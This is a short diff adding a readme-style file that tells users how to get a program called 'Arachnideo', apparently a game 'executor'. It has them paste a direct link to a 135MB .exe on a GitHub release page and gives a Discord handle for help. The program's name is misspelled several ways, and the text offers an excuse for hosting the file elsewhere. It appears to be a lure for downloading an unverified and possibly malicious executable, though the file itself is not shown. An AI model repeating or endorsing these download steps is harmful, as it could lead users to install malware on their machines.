@@ -1,0 +1,8 @@
+How can i use Arachnideo? Well, you're in the right file.
+Due to github not letting us upload more than 100mb on their site, we have to rely on Arachnideo's own repository.
+
+Paste the link below on your Browser's URL bar:
+https://github.com/arocimorr/Aracnideo-Executor/releases/download/Aracedeo/AracnideoExecutorUPDATED.exe
+
+After you paste the link, your download should begin and be down soon. The file is as big as 135MB.
+Contact @j5vz on Discord for any issues.
